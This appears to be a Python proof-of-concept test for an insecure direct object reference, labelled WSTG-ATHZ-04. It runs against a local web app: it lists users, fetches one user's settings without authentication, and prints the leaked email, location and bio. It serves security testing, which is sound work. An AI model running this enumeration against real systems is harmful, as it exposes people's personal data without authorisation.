"""
WSTG-ATHZ-04: Insecure Direct Object Reference — User Settings
Demonstrates that any user's settings can be read without authentication.
Expected: 200 response containing the target user's email and PII.
"""
import requests

BASE = "http://localhost:3000"

# Step 1: Get a user ID from public listing
users = requests.get(f"{BASE}/api/users")
target = users.json()["users"][0]

# Step 2: Access target's settings without auth
resp = requests.get(f"{BASE}/api/users/{target['id']}/settings")
print(f"Status: {resp.status_code}")
settings = resp.json()
print(f"Leaked data: {settings}")

assert resp.status_code == 200, "Expected 200 - IDOR not present"
assert "settings" in resp.json(), "Expected settings in response"
assert "email" in settings["settings"], "Expected email in settings"

print("\n[VULNERABLE] Settings IDOR confirmed")
print(f"Exposed email: {settings['settings']['email']}")
print(f"Exposed location: {settings['settings'].get('location', 'N/A')}")
print(f"Exposed bio: {settings['settings'].get('bio', 'N/A')}")
